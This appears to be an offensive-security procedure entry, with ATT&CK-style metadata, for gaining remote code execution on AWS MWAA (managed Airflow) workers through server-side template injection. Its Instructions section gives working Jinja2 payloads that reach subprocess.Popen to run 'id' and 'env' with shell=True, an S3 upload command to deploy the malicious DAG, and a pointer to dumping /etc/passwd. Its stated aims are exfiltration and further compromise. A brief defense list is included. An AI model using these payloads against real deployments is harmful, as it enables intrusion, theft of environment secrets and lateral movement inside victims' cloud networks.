---
tags:
  - rce
  - popen
  - shell
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/jinja2-execute-popen-command]]'
  - '[[commands/id-shell]]'
  - '[[commands/env-shell]]'
  - '[[commands/cat-etc-passwd]]'
verified: false
platforms:
  - AWS
  - Linux
submitted: true
created_at: '2024-10-01T00:00:00Z'
techniques:
  - '[[Python]]'
  - '[[Windows Command Shell]]'
updated_at: '2025-12-14T17:23:37.018Z'
sub_techniques: []
id: 7c61dbd1-7ab8-4844-a940-1e1868285866
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Python]]'
  - '[[Windows Command Shell]]'
---
# Execute-Arbitrary-Command-via-Popen-RCE

## Summary

This procedure achieves remote code execution by instantiating subprocess.Popen via the SSTI gadget chain to run arbitrary shell commands on the MWAA worker, capturing and rendering output in the Airflow UI.

## Description

With verified index, invoke Popen('command', shell=True, stdout=-1).communicate() in Jinja2 to execute OS commands. This bypasses Airflow's task isolation, allowing data exfil, file reads, or lateral movement within the VPC, limited by S3/IAM policies.

## Requirements

1. Valid Popen index
2. S3 upload and UI access
3. Knowledge of target commands for PoC

## Defense

Defensive measures and detection strategies:

- Patch to Airflow 2.9.3+ immediately
- Enforce customer-managed S3 policies denying malicious DAGs
- Monitor worker logs for Popen invocations and anomalous command outputs

## Objectives

1. Demonstrate RCE with PoC command
2. Exfiltrate system info (e.g., env, users)
3. Enable further compromise like data access

## Instructions

### Step 1: Construct RCE DAG

**Context**: Embed Popen call with test command.

**Command** ([[commands/jinja2-execute-popen-command]]):
```python
doc_md = "{{ ''.__class__.__mro__[1].__subclasses__()[292]('id', shell=True, stdout=-1).communicate() }}"
```

> Replace 'id' with other commands; save as test_4.py.

### Step 2: Upload and Trigger

**Context**: Execute to capture output.

**Command** (S3):
```bash
aws s3 cp test_4.py s3://your-mwaa-dags-bucket/
```

> Sync, trigger, view doc_md for command result.

### Step 3: Test Advanced Commands

**Context**: Escalate with file read or env dump.

For env: Use [[commands/env-shell]] in payload.

```python
doc_md = "{{ ''.__class__.__mro__[1].__subclasses__()[292]('env', shell=True, stdout=-1).communicate() }}"
```

For /etc/passwd: [[commands/cat-etc-passwd]]

> Output renders sensitive info if successful.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Python]]
- [[Windows Command Shell]]

### Sub-Techniques

-

## Commands Used

- [[commands/jinja2-execute-popen-command]]
- [[commands/id-shell]]
- [[commands/env-shell]]
- [[commands/cat-etc-passwd]]

## Tools Used

-

## Tags

- [[rce]]
- [[shell]]
